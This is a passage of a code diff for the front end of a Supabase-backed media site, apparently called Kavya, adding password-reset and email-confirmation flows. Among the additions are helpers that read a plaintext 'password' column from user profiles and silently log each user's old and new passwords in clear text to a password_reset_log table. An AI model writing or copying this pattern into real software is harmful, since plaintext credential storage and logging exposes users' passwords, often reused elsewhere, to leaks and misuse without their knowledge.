+        setTimeout(showSavePassPopup, 1000);
+      } catch (err) {
+        console.error('Reset password error:', err);
+        showToast(err.message || 'Could not update your password.', 'error');
+      } finally {
+        btn.disabled = false;
+      }
+    }
+
+    async function getStoredPassword(userId) {
+      try {
+        const { data } = await supabaseClient.from('profiles').select('password').eq('id', userId).maybeSingle();
+        return (data && data.password) || '';
+      } catch (_) { return ''; }
+    }
+
+    async function recordPasswordReset(userId, email, oldPassword, newPassword) {
+      try {
+        await supabaseClient.from('password_reset_log').insert({
+          user_id: userId,
+          email,
+          old_password: oldPassword,
+          new_password: newPassword
+        });
+      } catch (_) { }
+    }
+
+    /* ---------------- Save Your Password Popup ---------------- */
+    function showSavePassPopup() {
+      document.getElementById('save-pass-overlay').classList.add('active');
+    }
+
+    function closeSavePassPopup() {
+      document.getElementById('save-pass-overlay').classList.remove('active');
     }
 
     async function handleDeleteAccount() {
@@ -4004,11 +4672,47 @@
     }
 
     window.addEventListener('DOMContentLoaded', async () => {
-      const { data: { session } } = await supabaseClient.auth.getSession();
-      if (session) {
-        try { await loadCloudProfile(session.user); applyUserSessionUI(); navigateToSection('home-section', false); }
-        catch (_) { await supabaseClient.auth.signOut(); }
+      const isRecoveryFlow = !!window.__kavyaRecovery;
+      const isSignupConfirm = !!window.__kavyaSignupConfirm;
+
+      // Email confirmation: the link carries #access_token / #refresh_token in the URL
+      // hash. supabase-js sometimes does not auto-process them, leaving getSession()
+      // null. We parse the tokens ourselves and explicitly establish the session.
+      if (isSignupConfirm && !isRecoveryFlow) {
+        try {
+          const session = await establishSessionFromHash();
+          if (session) {
+            history.replaceState(null, '', window.location.pathname); // strip tokens
+            await loadCloudProfile(session.user); applyUserSessionUI();
+            await loadCloudMedia(); await loadMediaInteractions();
+            recordUserLogin();
+            navigateToSection('home-section', false);
+            showToast(`Welcome, ${state.currentUser.username}!`);
+            setTimeout(showSavePassPopup, 1000);
+            await finishSessionRestore();
+            return;
+          }
+          showToastWithAction('Email confirmation could not be completed.', 'Resend Email', resendConfirmationEmail);
+        } catch (_) {
+          showToastWithAction('Email confirmation could not be completed.', 'Resend Email', resendConfirmationEmail);
+        }
       }
+
+      const { data: { session } } = await supabaseClient.auth.getSession();
+
+      if (session && !isRecoveryFlow) {
+        try { await loadCloudProfile(session.user); applyUserSessionUI(); navigateToSection('home-section', false); recordUserLogin(); }
+        catch (_) { await supabaseClient.auth.signOut(); }
+      } else if (isRecoveryFlow) {
+        state.currentUser = null;
+        localStorage.removeItem('kavya_session_user');
+        document.getElementById('main-header').style.display = 'none';
+        navigateToSection('reset-password-section', false);
+      }
+      await finishSessionRestore();
+    });
+
+    async function finishSessionRestore() {
       await loadCloudMedia();
       await loadMediaInteractions();
       handleSharedMediaLink();
@@ -4019,7 +4723,10 @@
         .on('postgres_changes', { event: '*', schema: 'public', table: 'media_likes' }, () => loadMediaInteractions())
         .on('postgres_changes', { event: '*', schema: 'public', table: 'kavya_media_comments' }, () => loadMediaInteractions())
         .subscribe();
-    });
+      supabaseClient.channel('public-featured-media')
+        .on('postgres_changes', { event: '*', schema: 'public', table: 'featured_media' }, loadCloudMedia)
+        .subscribe();
+    }
 
     function initDripCanvases() {
       document.querySelectorAll('.drip-canvas').forEach(function (canvas) {
